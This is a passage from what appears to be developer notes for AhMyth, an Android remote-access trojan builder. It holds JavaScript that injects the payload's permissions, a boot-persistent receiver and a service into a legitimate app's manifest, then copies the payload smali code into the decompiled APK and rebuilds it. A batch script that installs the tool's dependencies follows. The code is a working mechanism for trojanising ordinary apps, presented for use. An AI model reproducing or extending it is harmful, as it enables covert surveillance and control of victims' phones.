                callback({
                    message: callbackErrors[0],
                    callbackErrors,
                });
                return;
            }

            const manifestObj = result.manifest;

            // Check if receiver and service properties are arrays
            if (!Array.isArray(manifestObj.application.receiver)) {
                manifestObj.application.receiver = manifestObj.application.receiver ? [manifestObj.application.receiver]: [];
            }

            if (!Array.isArray(manifestObj.application.service)) {
                manifestObj.application.service = manifestObj.application.service ? [manifestObj.application.service]: [];
            }

            // store existing permissions
            const existingPermissions = new Set();

            // Check if permissions already exist in the manifest
            if (manifestObj['uses-permission']) {
                if (!Array.isArray(manifestObj['uses-permission'])) {
                    manifestObj['uses-permission'] = [manifestObj['uses-permission']];
                }
                manifestObj['uses-permission'].forEach((permission) => {
                    existingPermissions.add(permission.$['android:name']);
                });
            } else {
                manifestObj['uses-permission'] = [];
            }

            // Check if features already exist in the manifest
            if (manifestObj['uses-feature']) {
                if (!Array.isArray(manifestObj['uses-feature'])) {
                    manifestObj['uses-feature'] = [manifestObj['uses-feature']];
                }
                manifestObj['uses-feature'].forEach((feature) => {
                    existingPermissions.add(feature.$['android:name']);
                });
            } else {
                manifestObj['uses-feature'] = [];
            }

            // Filter selected permissions to exclude duplicates
            const filteredPermissions = selectedPermissions.filter((permission, index, self) => {
                return self.indexOf(permission) === index && !existingPermissions.has(permission);
            });

            delayedLog('[★] Injecting AhMyth Payload Permissions...');

            // Add new permissions and features based on filteredPermissions
            filteredPermissions.forEach(permission => {
                if (permission === 'android.hardware.camera') {
                    manifestObj['uses-feature'].push({
                        $: {
                            'android:name': 'android.hardware.camera'
                        },
                        _: '' // Add empty string as element text
                    });
                }

                if (permission === 'android.hardware.camera.autofocus') {
                    manifestObj['uses-feature'].push({
                        $: {
                            'android:name': 'android.hardware.camera.autofocus'
                        },
                        _: '' // Add empty string as element text
                    });
                }

                if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                    manifestObj['uses-permission'].push({
                        $: {
                            'android:name': permission
                        },
                        _: '' // Add empty string as element text
                    });
                }
            });

            delayedLog('[★] Injecting AhMyth Payload Service and Receiver...');

            // Construct the receiver and service tags using constants
            const receiverTag = {
                $: {
                    'android:enabled': 'true',
                    'android:exported': 'true',
                    'android:name': CONSTANTS.ahmythReceiver,
                },
                'intent-filter': {
                    action: {
                        $: {
                            'android:name': 'android.intent.action.BOOT_COMPLETED',
                        },
                    },
                },
            };

            const serviceTag = {
                $: {
                    'android:enabled': 'true',
                    'android:exported': 'false',
                    'android:name': CONSTANTS.ahmythService,
                },
            };

            // Add the receiver and service tags to the application node
            manifestObj.application.receiver.push(receiverTag);
            manifestObj.application.service.push(serviceTag);

            const builder = new xml2js.Builder({
                renderOpts: {
                    pretty: true,
                    indent: '    '
                },
                headless: true
            });

            // Modify the parsed object by finding and updating the closing application tag
            const closingAppTag = '</application>';
            const modifiedClosingAppTag = '\n  </application>';
            const xmlString = builder.buildObject(result);
            const modifiedXml = xmlString.replace(closingAppTag,
                modifiedClosingAppTag);

            // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
            const closingManifestTag = '</manifest>';
            const finalModifiedXml = modifiedXml.replace(closingManifestTag,
                '</manifest>');

            callback(null,
                finalModifiedXml);
        });
    };
```
</details>
<br></br>

## `createPayloadDirectory` function and `copyAhmythFilesAndGenerateApk` function
> Needs to be updated to fix further *Unsigned Short Value Out of Range* errors with apktool
<details>
  <summary>Code</summary>

```js
    $appCtrl.createPayloadDirectory = (files) => {
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown',
            'smali_assets'];
        var smaliList = files.filter((item) => item.isDirectory() && !(ignoreDirs.includes(item.name))).map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length - 1];

        if (lastSmali == "smali") {
            payloadSmaliFolder = '/smali_classes2';
            return payloadSmaliFolder;
        } else {
            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber + 1;
            var payloadSmaliFolder = '/smali_classes' + newSmaliNumber;
            return payloadSmaliFolder;
        }
    };

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {

        delayedLog('[★] Reading the Decompiled Original Application...')
        fs.readdir(apkFolder, {
            withFileTypes: true
        }, (error, files) => {
            if (error) {
                delayedLog('[x] Failed to Read the Decompiled Original Application!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            const payloadSmaliFolder = $appCtrl.createPayloadDirectory(files);
            const targetPayloadFolder = dir.join(apkFolder, payloadSmaliFolder);

            delayedLog(`[★] Creating the ${payloadSmaliFolder} Directory...`);
            fs.mkdir(targetPayloadFolder, {
                recursive: true
            }, (error) => {
                if (error) {
                    delayedLog(`[x] Unable to Create the ${payloadSmaliFolder} Directory!`, CONSTANTS.logStatus.FAIL);
                    return;
                }

                delayedLog(`[★] Copying Payload Files to the ${payloadSmaliFolder} Directory...`);
                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
                    overwrite: true
                }, (error) => {
                    if (error) {
                        delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Copying');
                        delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    // Copy android directory to the smali folder in the apkFolder
                    fs.copy(dir.join(targetPayloadFolder, 'android'), dir.join(apkFolder, 'smali', 'android'), {
                        overwrite: true
                    }, (error) => {
                        if (error) {
                            delayedLog('[x] Copying "android" directory failed!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Copying "android" directory');
                            delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Copy androidx directory to the smali folder in the apkFolder
                        fs.copy(dir.join(targetPayloadFolder, 'androidx'), dir.join(apkFolder, 'smali', 'androidx'), {
                            overwrite: true
                        }, (error) => {
                            if (error) {
                                delayedLog('[x] Copying "androidx" directory failed!', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'Copying "androidx" directory');
                                delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // Remove the original 'android' and 'androidx' directories
                            fs.rmdir(dir.join(targetPayloadFolder, 'android'), {
                                recursive: true
                            });
                            fs.rmdir(dir.join(targetPayloadFolder, 'androidx'), {
                                recursive: true
                            });

                            // Continue with Apk generation
                            $appCtrl.GenerateApk(apkFolder);
                        });
                    });
                });
            });
        });
    }
```
</details>
<br>

## Updated `autoinstall_win.bat` file.
> Makes use of the Windows Package Manager "Chocolatey" to automate installing external AhMyth Dependencies
>> Needs to be updated to look cleaner, present messages longer, check for `npm` as well as to see if any version of Java 8 through Java 21 is installed
<details>
    <summary>Updated "autoinstall_win.bat" file</summary>

```batch
@echo off

REM Step 1: Check for Chocolatey
echo [i] Checking to see if the Windows Package Manager "Chocolatey" is installed....
choco -? >nul 2>&1
if %errorlevel% neq 0 (
    echo [x] The Windows Package Manager "Chocolatey" is not installed on your system. This script requires "Chocolatey" to operate further, please install it.
    exit /b
) else (
    echo [Success] The Windows Package Manager "Chocolatey" is installed, proceeding....
)

REM Step 2: Check for Java installation
echo [i] Checking to see if Java is installed....
java -version >nul 2>&1
if %errorlevel% neq 0 (
    echo [i] Installing Java 17....
    choco install -y openjdk17
) else (
    echo [Success] Java is installed, proceeding....
)

REM Step 3: Check for Node.js and npm
echo [i] Checking to see if Node.js and npm are installed....
where node >nul 2>&1
if %errorlevel% neq 0 (
    echo [i] Installing Node.js and npm....
    choco install -y nodejs
) else (
    echo [Success] Node.js is installed, proceeding....
)

exit /b
```
</details>

